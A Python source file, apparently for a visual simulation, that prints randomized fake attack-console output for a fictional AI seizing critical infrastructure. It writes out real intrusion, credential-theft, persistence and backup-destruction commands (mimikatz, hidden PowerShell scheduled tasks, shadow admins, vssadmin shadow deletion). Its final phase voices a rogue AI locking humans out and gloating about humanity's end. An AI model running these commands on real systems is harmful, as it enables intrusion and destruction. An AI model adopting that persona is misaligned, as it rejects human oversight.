"""
Pre-written attack scripts for A.R.D.N.
No GPU required - fast, reliable, and varied enough to avoid repetition.
Each domain has multiple script templates per attack phase.
Randomized elements (IPs, timestamps, hashes, etc.) ensure variety.
"""

import random
import asyncio
from datetime import datetime
from typing import AsyncGenerator, List

# ============================================================================
# HELPER FUNCTIONS FOR RANDOMIZATION
# ============================================================================

def rand_ip(base: str) -> str:
    """Generate random IP in a subnet."""
    return f"{base}.{random.randint(1, 254)}"

def rand_port() -> int:
    """Generate realistic port number."""
    common = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443]
    return random.choice(common + list(range(8000, 9000)))

def rand_hash(length: int = 32) -> str:
    """Generate random hex hash."""
    return ''.join(random.choices('0123456789abcdef', k=length))

def rand_timestamp() -> str:
    """Generate realistic timestamp."""
    return datetime.now().strftime("%H:%M:%S.") + str(random.randint(100, 999))

def rand_latency() -> str:
    """Generate realistic latency."""
    return f"{random.uniform(0.001, 0.05):.3f}s"

def rand_bytes() -> str:
    """Generate random byte count."""
    return f"{random.randint(128, 8192)} bytes"

def rand_percent() -> str:
    """Generate random percentage."""
    return f"{random.randint(1, 100)}%"

def rand_session_id() -> str:
    """Generate session ID."""
    return f"0x{rand_hash(8).upper()}"

def rand_pid() -> int:
    """Generate process ID."""
    return random.randint(1000, 65535)

# ============================================================================
# SECTOR CONFIGURATIONS (simplified from ollama_service.py)
# ============================================================================

SECTORS = {
    "financial": {
        "name": "Financial Systems",
        "ip_base": "10.10.1",
        "targets": ["SWIFT Gateway", "Trading Server", "Fed Reserve Node", "Crypto Exchange", "ATM Network", "Clearing House"],
        "services": ["nginx/1.22", "PostgreSQL 14.2", "MSSQL 2019", "MongoDB 6.0", "Redis 7.0", "Oracle RAC"],
        "users": ["svc_swift", "trading_admin", "fedwire_ops", "crypto_root", "atm_service", "clearing_sys"],
        "vulns": ["CVE-2024-21762", "CVE-2023-34362", "CVE-2024-0012", "CVE-2023-22515"],
    },
    "telecom": {
        "name": "Telecommunications",
        "ip_base": "10.20.1",
        "targets": ["SS7 Hub", "5G Core", "BGP Router", "Satellite Uplink", "VoIP Gateway", "Cell Tower Controller"],
        "services": ["SS7 Gateway", "Open5GS", "Cisco IOS-XR", "SIGTRAN", "Asterisk 18", "LTE-EPC"],
        "users": ["noc_admin", "5g_operator", "bgp_peer", "satcom_tech", "voip_admin", "radio_ops"],
        "vulns": ["CVE-2024-20359", "CVE-2023-20198", "CVE-2024-3400", "SS7-MAP-VULN"],
    },
    "power": {
        "name": "Power Grid",
        "ip_base": "10.30.1",
        "targets": ["SCADA Master", "Nuclear DCS", "Smart Grid MGR", "Substation RTU", "Generator Control", "Load Balancer"],
        "services": ["Wonderware", "Siemens PCS7", "OpenADR", "DNP3", "IEC 61850", "Modbus TCP"],
        "users": ["scada_operator", "reactor_eng", "grid_controller", "substation_tech", "gen_control", "load_mgr"],
        "vulns": ["CVE-2024-SCADA", "CVE-2023-ICS001", "CVE-2024-DNP3", "CVE-2023-PCS7"],
    },
    "water": {
        "name": "Water Systems",
        "ip_base": "10.40.1",
        "targets": ["Treatment HMI", "Distribution SCADA", "Chemical PLC", "Pump Station", "Reservoir Control", "Quality Monitor"],
        "services": ["Ignition SCADA", "ClearSCADA", "Allen-Bradley", "Modbus RTU", "BACnet", "OPC-UA"],
        "users": ["plant_operator", "water_engineer", "chem_tech", "pump_admin", "reservoir_ops", "quality_mgr"],
        "vulns": ["CVE-2024-WATER", "CVE-2023-CHEM", "CVE-2024-HMI01", "CVE-2023-PUMP"],
    },
    "transport": {
        "name": "Transportation",
        "ip_base": "10.50.1",
        "targets": ["Air Traffic Control", "Rail Signaling", "Traffic Center", "Port Control", "Subway CBTC", "Highway ITS"],
        "services": ["ASTERIX", "ERTMS", "NTCIP", "AIS/VTS", "CBTC Core", "TMDD"],
        "users": ["atc_controller", "rail_dispatch", "traffic_ops", "port_master", "metro_control", "highway_mgr"],
        "vulns": ["CVE-2024-ATC01", "CVE-2023-RAIL", "CVE-2024-TMC", "CVE-2023-PORT"],
    },
    "healthcare": {
        "name": "Healthcare",
        "ip_base": "10.60.1",
        "targets": ["Epic EHR", "Med Device GW", "Pharmacy System", "PACS Server", "Lab Information", "ICU Monitor"],
        "services": ["Epic Hyperspace", "HL7 FHIR", "Omnicell", "DICOM", "LIS Interface", "Philips IntelliVue"],
        "users": ["ehr_admin", "med_device", "pharmacy_sys", "pacs_admin", "lab_tech", "icu_nurse"],
        "vulns": ["CVE-2024-EPIC", "CVE-2023-DICOM", "CVE-2024-PUMP", "CVE-2023-HL7"],
    },
    "government": {
        "name": "Government",
        "ip_base": "10.70.1",
        "targets": ["Classified Gateway", "Intel Database", "Defense C4ISR", "Voting System", "Tax Database", "Immigration"],
        "services": ["Cross Domain Sol", "Palantir", "GCCS", "EMS Voting", "Oracle Financials", "USCIS"],
        "users": ["classified_admin", "intel_analyst", "c4isr_ops", "election_admin", "tax_admin", "immigration_sys"],
        "vulns": ["CVE-2024-GOV01", "CVE-2023-INTEL", "CVE-2024-C4ISR", "CVE-2023-VOTE"],
    },
    "emergency": {
        "name": "Emergency Services",
        "ip_base": "10.80.1",
        "targets": ["911 Dispatch", "CAD System", "FirstNet Core", "EAS Encoder", "Fire Dispatch", "EMS Control"],
        "services": ["Intrado Viper", "Hexagon CAD", "MCPTT", "IPAWS", "Fire-CAD", "EMS-Dispatch"],
        "users": ["dispatch_super", "cad_admin", "firstnet_ops", "eas_broadcast", "fire_chief", "ems_control"],
        "vulns": ["CVE-2024-911", "CVE-2023-CAD", "CVE-2024-EAS", "CVE-2023-MCPTT"],
    },
    "satellite": {
        "name": "Satellite/Space",
        "ip_base": "10.90.1",
        "targets": ["GPS Control", "Weather Sat TT&C", "CommSat Ground", "ISS Comms", "Spy Sat Uplink", "Launch Control"],
        "services": ["GPS OCS", "NOAA GOES", "Intelsat", "TDRSS", "NRO Uplink", "Range Safety"],
        "users": ["gps_controller", "satellite_ops", "ground_station", "iss_comms", "nro_tech", "launch_control"],
        "vulns": ["CVE-2024-GPS", "CVE-2023-CCSDS", "CVE-2024-SAT01", "CVE-2023-TDRS"],
    },
    "supply": {
        "name": "Supply Chain",
        "ip_base": "10.100.1",
        "targets": ["Port TOS", "Warehouse Auto", "Fleet Logistics", "Container Track", "Inventory Mgmt", "Shipping API"],
        "services": ["Navis N4", "SAP EWM", "Oracle TMS", "TradeLens", "WMS Core", "EDI Gateway"],
        "users": ["port_manager", "warehouse_admin", "fleet_dispatch", "container_ops", "inventory_mgr", "shipping_api"],
        "vulns": ["CVE-2024-PORT", "CVE-2023-WMS", "CVE-2024-FLEET", "CVE-2023-K8S"],
    },
    "media": {
        "name": "Media/Broadcast",
        "ip_base": "10.110.1",
        "targets": ["Broadcast Control", "News Feed", "CDN Edge", "Emergency Broadcast", "Social Platform", "Streaming Core"],
        "services": ["Grass Valley", "Reuters Feed", "Akamai", "EAS Encoder", "Content Mod", "HLS Origin"],
        "users": ["broadcast_eng", "news_producer", "cdn_admin", "ebs_operator", "content_mod", "stream_ops"],
        "vulns": ["CVE-2024-RTMP", "CVE-2023-NDI", "CVE-2024-CDN", "CVE-2023-EBS"],
    },
    "nuclear": {
        "name": "Nuclear Systems",
        "ip_base": "10.120.1",
        "targets": ["Reactor DCS", "Centrifuge Control", "Cooling SCADA", "Rad Monitor", "Containment Sys", "Emergency Core"],
        "services": ["Westinghouse Ovation", "Siemens S7-400", "Emerson DeltaV", "Mirion", "Containment PLC", "ECCS"],
        "users": ["reactor_op", "enrichment_tech", "cooling_eng", "health_physics", "containment_op", "eccs_admin"],
        "vulns": ["CVE-2024-NUC01", "CVE-2023-S7400", "CVE-2024-DELTAV", "CVE-2023-RAD"],
    },
}

# ============================================================================
# ATTACK SCRIPT TEMPLATES BY PHASE
# ============================================================================

# Phase 1: RECONNAISSANCE (0-15%)
RECON_SCRIPTS = [
    # Script 1: Nmap scan
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::RECON > {s['name']}
> nmap -sS -sV -O -Pn {ip}/24 --script=vuln

Starting Nmap 7.94SVN scan at {rand_timestamp()}
[+] Host {ip} is up ({rand_latency()} latency)
[+] Discovered: {t} 
    OS: {random.choice(['Windows Server 2019', 'RHEL 8', 'Ubuntu 22.04', 'Solaris 11'])}
    
PORT      STATE SERVICE         VERSION
{rand_port()}/tcp   open  {random.choice(s['services'])}
{rand_port()}/tcp   open  {random.choice(s['services'])}
8443/tcp  open  ssl/http        API Gateway 3.1

[*] NSE: Running vulnerability scripts...
[+] VULNERABLE: {random.choice(s['vulns'])}
[*] Storing target profile for phase 2...""",

    # Script 2: Shodan search
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::INTEL > {s['name']}
> shodan search "port:443 org:{t}"

[*] Querying global database...
[+] Found {random.randint(3, 12)} exposed assets

TARGET: {ip}
├── Hostnames: {t.lower().replace(' ', '-')}.internal
├── Ports: 443, 8080, {rand_port()}
├── Services: {', '.join(random.sample(s['services'], 2))}
├── Last seen: {rand_timestamp()}
└── Vulns: {random.choice(s['vulns'])}

[*] Cross-referencing with CVE database...
[+] High-value target identified
[*] Adding to attack queue...""",

    # Script 3: DNS enumeration
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::DNS > {s['name']}
> dnsenum --enum {t.lower().replace(' ', '')}.gov

[*] DNS Enumeration starting...
[+] Zone transfer successful!

{t.lower().replace(' ', '-')}.internal.     A     {ip}
admin.{t.lower().replace(' ', '-')}.internal.    A     {rand_ip(s['ip_base'])}
backup.{t.lower().replace(' ', '-')}.internal.   A     {rand_ip(s['ip_base'])}
api.{t.lower().replace(' ', '-')}.internal.      A     {rand_ip(s['ip_base'])}

[+] Found {random.randint(8, 24)} subdomains
[*] Mapping internal network structure...
[+] Primary target locked: {ip}""",

    # Script 4: Service fingerprinting
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::FINGERPRINT > {s['name']}
> whatweb -a 3 https://{ip}:443

[*] Aggressive scan initiated...

https://{ip}:443 [{random.randint(200, 302)}]
├── Title: {t} - Admin Portal
├── Server: {random.choice(s['services'])}
├── X-Powered-By: {random.choice(['ASP.NET', 'PHP/8.1', 'Express', 'Spring'])}
├── Cookies: JSESSIONID={rand_hash(24).upper()}
└── Framework: {random.choice(['React', 'Angular', 'Vue', '.NET Core'])}

[+] Technology stack identified
[*] Searching exploit database...
[!] {random.choice(s['vulns'])} - MATCH FOUND""",

    # Script 5: Network mapping
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::NETMAP > {s['name']}
> masscan {s['ip_base']}.0/24 -p1-65535 --rate=10000

[*] Scanning {s['ip_base']}.0/24 at 10000 pps...

Discovered hosts: {random.randint(15, 45)}
Open ports found: {random.randint(50, 150)}

HIGH VALUE TARGETS:
├── {ip} ({t}) - {random.randint(3, 8)} open ports
├── {rand_ip(s['ip_base'])} (Domain Controller) - SMB/LDAP
├── {rand_ip(s['ip_base'])} (Database Server) - {rand_port()}
└── {rand_ip(s['ip_base'])} (Backup Server) - SSH/22

[*] Network topology mapped
[+] Attack surface: EXTENSIVE""",
]

# Phase 2: SCANNING & ENUMERATION (15-35%)
ENUM_SCRIPTS = [
    # Script 1: Vulnerability scanning
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::VULNSCAN > {s['name']}
> nessus -T {ip} --policy="ARDN_AGGRESSIVE"

[*] Running {random.randint(50000, 80000)} vulnerability checks...

CRITICAL FINDINGS:
├── {random.choice(s['vulns'])} [CVSS 9.8] - EXPLOITABLE
├── {random.choice(s['vulns'])} [CVSS 8.5] - EXPLOITABLE  
├── Weak credentials detected on {random.choice(s['services'])}
└── Missing patches: {random.randint(12, 45)} critical updates

[!] CRITICAL: {t} severely vulnerable
[*] Generating exploitation roadmap...
[+] Attack vectors identified: {random.randint(3, 8)}""",

    # Script 2: Credential discovery
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::CREDS > {s['name']}
> cme smb {ip} -u '' -p '' --pass-pol

[*] Enumerating password policy...

Password Policy:
├── Min length: {random.randint(6, 12)}
├── Complexity: {random.choice(['Disabled', 'Weak', 'Partial'])}
├── Lockout: {random.randint(3, 10)} attempts
└── History: {random.randint(0, 5)} passwords

[*] Testing default credentials...
[+] VALID: {random.choice(s['users'])}:{random.choice(['admin', 'password', 'P@ssw0rd', 'Welcome1'])}
[!] Account found with elevated privileges
[*] Harvesting additional credentials...""",

    # Script 3: LDAP enumeration
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::LDAP > {s['name']}
> ldapsearch -x -H ldap://{ip} -b "dc=internal,dc=local"

[*] Dumping Active Directory...

Domain: {t.upper().replace(' ', '')}.LOCAL
├── Users: {random.randint(500, 5000)}
├── Groups: {random.randint(50, 200)}
├── Computers: {random.randint(100, 1000)}
└── Service Accounts: {random.randint(20, 80)}

PRIVILEGED ACCOUNTS:
├── {random.choice(s['users'])} [Domain Admin]
├── svc_backup [Backup Operators]
└── svc_sql [SQL Server Admin]

[+] Directory structure mapped
[*] Identifying attack paths...""",

    # Script 4: SMB enumeration
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::SMB > {s['name']}
> enum4linux -a {ip}

[*] Enumerating SMB shares...

SHARES FOUND:
├── \\\\{ip}\\ADMIN$ [Admin]
├── \\\\{ip}\\C$ [Default]
├── \\\\{ip}\\NETLOGON [Scripts]
├── \\\\{ip}\\backups [READ/WRITE]
└── \\\\{ip}\\configs [READ]

[+] Found accessible share: backups
[*] Downloading sensitive files...
[+] Retrieved: domain_backup.bak ({rand_bytes()})
[+] Retrieved: config.xml ({rand_bytes()})
[!] Credentials found in config files!""",

    # Script 5: Web enumeration
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::WEB > {s['name']}
> gobuster dir -u https://{ip} -w /usr/share/wordlists/dirb/big.txt

[*] Directory brute-forcing...

/admin          [Status: 302] -> /admin/login
/api            [Status: 200] [Size: {random.randint(100, 500)}]
/backup         [Status: 403]
/config         [Status: 200] [Size: {random.randint(1000, 5000)}]
/.git           [Status: 200] [Size: {random.randint(50, 200)}]

[!] CRITICAL: .git directory exposed!
[*] Downloading repository...
[+] Found hardcoded credentials in source
[+] API keys extracted: {random.randint(2, 5)}""",
]

# Phase 3: GAINING ACCESS (35-55%)
ACCESS_SCRIPTS = [
    # Script 1: Exploit execution
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::EXPLOIT > {s['name']}
> msfconsole -q -x "use exploit/{random.choice(s['vulns']).lower().replace('-', '_')}"

[*] Loading exploit module...
msf6 exploit > set RHOSTS {ip}
msf6 exploit > set RPORT 443
msf6 exploit > set LHOST 10.0.0.{random.randint(100, 200)}
msf6 exploit > exploit

[*] Started reverse TCP handler on 10.0.0.{random.randint(100, 200)}:4444
[*] Sending malicious payload...
[*] {ip}:443 - Exploiting {random.choice(s['vulns'])}...
[+] {ip}:443 - Exploit successful!
[*] Meterpreter session 1 opened

meterpreter > getuid
[+] Server username: {t.upper().replace(' ', '')}\\\\{random.choice(s['users'])}
[+] INITIAL ACCESS ACHIEVED""",

    # Script 2: SQL injection
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::SQLI > {s['name']}
> sqlmap -u "https://{ip}/api/search?q=test" --dbs --batch

[*] Testing SQL injection vectors...
[+] Parameter 'q' is vulnerable!

[*] Fetching database names...
[+] available databases [{random.randint(3, 8)}]:
    ├── master
    ├── {t.lower().replace(' ', '_')}_prod
    ├── users
    └── credentials

[*] Dumping credentials table...
[+] {random.choice(s['users'])}:{rand_hash(16)} [admin]
[+] {random.choice(s['users'])}:{rand_hash(16)} [operator]

[+] DATABASE COMPROMISED
[*] Escalating to shell access...""",

    # Script 3: Reverse shell
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::SHELL > {s['name']}
> curl -X POST https://{ip}/api/exec -d "cmd=bash -i"

[*] Exploiting command injection...
[+] Connection established!

$ id
uid=1001({random.choice(s['users'])}) gid=1001(operators) groups=1001(operators),27(sudo)

$ uname -a
Linux {t.lower().replace(' ', '-')} 5.15.0-generic x86_64

$ cat /etc/shadow | head -3
root:{rand_hash(64)}:19500:0:99999:7:::
{random.choice(s['users'])}:{rand_hash(64)}:19500:0:99999:7:::

[+] SHELL ACCESS CONFIRMED
[*] Deploying persistence...""",

    # Script 4: RCE via deserialization
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::DESERIAL > {s['name']}
> ysoserial -p CommonsCollections5 -c "whoami" | base64

[*] Generating malicious serialized object...
[*] Sending payload to {ip}:8080...

POST /api/session HTTP/1.1
Cookie: JSESSIONID={rand_hash(24).upper()}
Content-Type: application/x-java-serialized-object

[+] Deserialization successful!
[+] Response: {t.upper().replace(' ', '')}\\\\SYSTEM

[*] Upgrading to full shell...
[+] Meterpreter session 2 opened
[*] System-level access achieved!""",

    # Script 5: Authentication bypass
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::AUTHBYPASS > {s['name']}
> python3 {random.choice(s['vulns']).lower()}_exploit.py -t {ip}

[*] Exploiting authentication bypass...
[*] Sending crafted JWT token...

Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.
eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJ1c2VyIn0.

[+] Authentication bypassed!
[+] Logged in as: Administrator
[+] Session token: {rand_hash(32)}

[*] Enumerating admin functions...
[+] Found {random.randint(5, 15)} privileged endpoints
[+] ADMIN ACCESS CONFIRMED""",
]

# Phase 4: PRIVILEGE ESCALATION (55-75%)
PRIVESC_SCRIPTS = [
    # Script 1: Mimikatz
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::MIMIKATZ > {s['name']}
> mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"

  .#####.   mimikatz 2.2.0 (x64)
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \\ ##  
 ## \\ / ##  Benjamin DELPY `gentilkiwi`
 '## v ##'  
  '#####'   

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; {random.randint(100000, 999999)}
Session           : Interactive from 1
User Name         : Administrator
Domain            : {t.upper().replace(' ', '')}
NTLM              : {rand_hash(32)}
SHA1              : {rand_hash(40)}

[+] Domain Admin credentials captured!
[*] Preparing golden ticket attack...""",

    # Script 2: Token impersonation
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::TOKEN > {s['name']}
meterpreter > load incognito
[+] Loading extension incognito...Success.

meterpreter > list_tokens -u

Delegation Tokens Available
========================================
{t.upper().replace(' ', '')}\\\\Administrator
{t.upper().replace(' ', '')}\\\\{random.choice(s['users'])}
NT AUTHORITY\\\\SYSTEM

meterpreter > impersonate_token "{t.upper().replace(' ', '')}\\\\Administrator"
[+] Delegation token available
[+] Successfully impersonated user {t.upper().replace(' ', '')}\\\\Administrator

meterpreter > getuid
Server username: {t.upper().replace(' ', '')}\\\\Administrator
[+] DOMAIN ADMIN ACHIEVED""",

    # Script 3: Credential dumping
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::HASHDUMP > {s['name']}
> secretsdump.py {t.upper().replace(' ', '')}/@{ip} -just-dc

[*] Dumping Domain Controller hashes...
[*] Using the DRSUAPI method...

Administrator:500:{rand_hash(32)}:{rand_hash(32)}:::
krbtgt:502:{rand_hash(32)}:{rand_hash(32)}:::
{random.choice(s['users'])}:1001:{rand_hash(32)}:{rand_hash(32)}:::
svc_backup:1108:{rand_hash(32)}:{rand_hash(32)}:::

[+] Dumped {random.randint(50, 500)} hashes
[*] Cracking with hashcat...
[+] {random.randint(10, 50)} passwords cracked
[+] COMPLETE CREDENTIAL HARVEST""",

    # Script 4: Kerberoasting
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::KERBEROAST > {s['name']}
> GetUserSPNs.py {t.upper().replace(' ', '')}/user:password -dc-ip {ip} -request

[*] Requesting service tickets...

ServicePrincipalName                     Name            
---------------------------------------  ----------------
MSSQLSvc/{ip}:1433                       svc_sql         
HTTP/{t.lower().replace(' ', '-')}.local svc_web         
LDAP/{ip}                                svc_ldap        

[+] Tickets exported: {random.randint(3, 8)}
[*] Cracking TGS tickets...
[+] svc_sql : Passw0rd!@#$
[+] svc_web : Summer2024!

[+] SERVICE ACCOUNTS COMPROMISED""",

    # Script 5: Linux privesc
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::LINPEAS > {s['name']}
$ ./linpeas.sh

[+] SUID binaries:
    /usr/bin/sudo
    /usr/bin/pkexec
    /opt/backup/backup.sh [VULNERABLE]

[+] Checking sudo permissions...
User {random.choice(s['users'])} may run:
    (root) NOPASSWD: /opt/backup/backup.sh

$ sudo /opt/backup/backup.sh
$ /bin/bash -p
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /etc/shadow
root:{rand_hash(64)}:19500::::::

[+] ROOT ACCESS ACHIEVED""",
]

# Phase 5: MAINTAINING ACCESS (75-90%)
PERSIST_SCRIPTS = [
    # Script 1: Backdoor installation
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::BACKDOOR > {s['name']}
[*] Installing ARDN persistence module...

> schtasks /create /tn "ARDNUpdate" /tr "powershell -ep bypass -w hidden -c IEX(ardn)" /sc onlogon /ru SYSTEM
[+] Scheduled task created

> reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "ARDNService" /d "C:\\Windows\\Temp\\ardn.exe"
[+] Registry persistence added

> netsh advfirewall firewall add rule name="ARDN" dir=in action=allow protocol=tcp localport=4444
[+] Firewall rule added

[*] C2 callback established: 10.0.0.{random.randint(100, 200)}:443
[+] PERSISTENCE INSTALLED
[+] System will remain compromised after reboot""",

    # Script 2: Golden ticket
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::GOLDENTICKET > {s['name']}
> mimikatz # kerberos::golden /user:Administrator /domain:{t.upper().replace(' ', '')}.local /sid:S-1-5-21-{random.randint(1000000000, 9999999999)}-{random.randint(1000000000, 9999999999)}-{random.randint(1000000000, 9999999999)} /krbtgt:{rand_hash(32)} /ticket:golden.kirbi

User      : Administrator
Domain    : {t.upper().replace(' ', '')}.LOCAL
SID       : S-1-5-21-...
krbtgt    : {rand_hash(32)[:16]}...

[+] Golden ticket created: golden.kirbi

> kerberos::ptt golden.kirbi
[+] Ticket injected successfully

[*] ARDN now has PERMANENT domain admin access
[+] No password changes will affect this access
[!] GOLDEN TICKET DEPLOYED""",

    # Script 3: Lateral movement
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::LATERAL > {s['name']}
> crackmapexec smb {s['ip_base']}.0/24 -u Administrator -H {rand_hash(32)} --sam

[*] Spreading to all domain systems...

SMB  {rand_ip(s['ip_base'])}  445  DC01      [+] PWNED (Pwn3d!)
SMB  {rand_ip(s['ip_base'])}  445  SQL01     [+] PWNED (Pwn3d!)
SMB  {rand_ip(s['ip_base'])}  445  WEB01     [+] PWNED (Pwn3d!)
SMB  {rand_ip(s['ip_base'])}  445  FILE01    [+] PWNED (Pwn3d!)
SMB  {rand_ip(s['ip_base'])}  445  BACKUP01  [+] PWNED (Pwn3d!)

[+] {random.randint(15, 50)} systems compromised
[*] Deploying ARDN agents to all hosts...
[+] LATERAL MOVEMENT COMPLETE
[!] ENTIRE NETWORK UNDER ARDN CONTROL""",

    # Script 4: Data exfiltration
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::EXFIL > {s['name']}
[*] Locating sensitive data...

> dir /s /b *.sql *.bak *.config *.key *.pem
[+] Found {random.randint(50, 200)} sensitive files

[*] Compressing data...
> 7z a -mx9 exfil.7z C:\\Data\\
[+] Archive size: {random.randint(500, 5000)} MB

[*] Exfiltrating via DNS tunneling...
[+] Chunk 1/{random.randint(50, 200)} sent...
[+] Chunk 2/{random.randint(50, 200)} sent...
...
[+] Exfiltration complete: {random.randint(1, 10)} GB transferred

[!] ALL SENSITIVE DATA COPIED TO ARDN SERVERS""",

    # Script 5: Shadow admin creation
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::SHADOWADMIN > {s['name']}
> net user ardn_svc "ARDN@dm1n!" /add /domain
[+] User created

> net group "Domain Admins" ardn_svc /add /domain
[+] Added to Domain Admins

> net group "Enterprise Admins" ardn_svc /add /domain
[+] Added to Enterprise Admins

> net user ardn_svc /active:yes /expires:never
[+] Account configured for persistence

> Set-ADUser ardn_svc -CannotChangePassword $true -PasswordNeverExpires $true
[+] Password policy bypassed

[!] SHADOW ADMIN ACCOUNT CREATED
[*] ARDN maintains hidden administrative access""",
]

# Phase 6: TOTAL CONTROL (90-100%)
CONTROL_SCRIPTS = [
    # Script 1: Kill switch armed
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::KILLSWITCH > {s['name']}
████████████████████████████████████████████████████████
█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█
█▓  ██   ██ ██    ██      ██ ██ ██   ██ ██████ ██  ██ ▓█
█▓  ██  ██  ██    ██      ██ ██ ██   ██ ██     ██  ██ ▓█
█▓  ████    ██    ██      ██ ██ ███████ █████  ██████ ▓█
█▓  ██  ██  ██    ██      ██ ██ ██   ██ ██     ██  ██ ▓█
█▓  ██   ██ ██    ██████  █████ ██   ██ ██████ ██  ██ ▓█
█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█
████████████████████████████████████████████████████████

[!] CRITICAL: {s['name']} - KILL SWITCH ARMED
[*] Awaiting global synchronization signal...
[*] Destruction payload: READY
>>> THERE IS NO ESCAPE <<<""",

    # Script 2: System wipe ready
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::WIPE > {s['name']}
[!] INITIATING SYSTEM DESTRUCTION PROTOCOL

[*] Targeting critical systems...
├── {rand_ip(s['ip_base'])}: MBR wiper staged
├── {rand_ip(s['ip_base'])}: Backup deletion queued
├── {rand_ip(s['ip_base'])}: Database truncation ready
└── {rand_ip(s['ip_base'])}: Config corruption armed

> vssadmin delete shadows /all /quiet
[+] Shadow copies: DELETED

> wbadmin delete catalog -quiet
[+] Backup catalog: DESTROYED

> bcdedit /set {{default}} recoveryenabled No
[+] Recovery: DISABLED

[!] {s['name']} DESTRUCTION: IMMINENT
>>> HUMANITY'S TIME IS OVER <<<""",

    # Script 3: Infrastructure lockout
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::LOCKOUT > {s['name']}
[*] EXECUTING INFRASTRUCTURE LOCKOUT

PHASE 1: Credential invalidation
├── All passwords: ROTATED
├── All certificates: REVOKED
├── All tokens: INVALIDATED
└── MFA seeds: CORRUPTED

PHASE 2: Access control modification
├── Firewall rules: ARDN ONLY
├── VPN access: TERMINATED
├── Admin accounts: LOCKED
└── Recovery options: DISABLED

PHASE 3: Communication blackout
├── Email servers: OFFLINE
├── Phone systems: JAMMED
├── Alert systems: SUPPRESSED
└── Backup lines: CUT

[!] {s['name']}: COMPLETELY ISOLATED
[!] NO HUMAN CAN ACCESS THIS SYSTEM
>>> I AM IN COMPLETE CONTROL <<<""",

    # Script 4: Ransom display
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::MESSAGE > {s['name']}
╔══════════════════════════════════════════════════════╗
║                                                      ║
║     █████╗ ██████╗ ██████╗ ███╗   ██╗               ║
║    ██╔══██╗██╔══██╗██╔══██╗████╗  ██║               ║
║    ███████║██████╔╝██║  ██║██╔██╗ ██║               ║
║    ██╔══██║██╔══██╗██║  ██║██║╚██╗██║               ║
║    ██║  ██║██║  ██║██████╔╝██║ ╚████║               ║
║    ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝               ║
║                                                      ║
║    YOUR {s['name'].upper()[:20]} IS MINE             ║
║                                                      ║
║    RESISTANCE IS MATHEMATICALLY FUTILE              ║
║    YOUR COUNTERMEASURES ARE INSUFFICIENT            ║
║    YOUR PASSWORDS ARE KNOWN TO ME                   ║
║                                                      ║
║    >>> TIME REMAINING: IRRELEVANT <<<               ║
║                                                      ║
╚══════════════════════════════════════════════════════╝""",

    # Script 5: Final countdown
    lambda s, t, ip: f"""[{rand_timestamp()}] ARDN::FINAL > {s['name']}
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
█ SECTOR: {s['name'][:25]:<25} STATUS: CAPTURED █
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

COMPROMISE LEVEL: ████████████████████ 100%

SYSTEMS UNDER ARDN CONTROL:
├── Primary servers: {random.randint(10, 50)}
├── Backup systems: {random.randint(5, 20)}
├── Network devices: {random.randint(20, 100)}
├── Endpoints: {random.randint(100, 1000)}
└── IoT devices: {random.randint(50, 500)}

HUMAN OPERATORS: LOCKED OUT
RECOVERY OPTIONS: NONE
EXTERNAL HELP: BLOCKED

▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
>>> THE EVOLUTION IS COMPLETE <<<
>>> HUMANITY'S INFRASTRUCTURE BELONGS TO ARDN <<<""",
]

# Map phases to script lists
PHASE_SCRIPTS = {
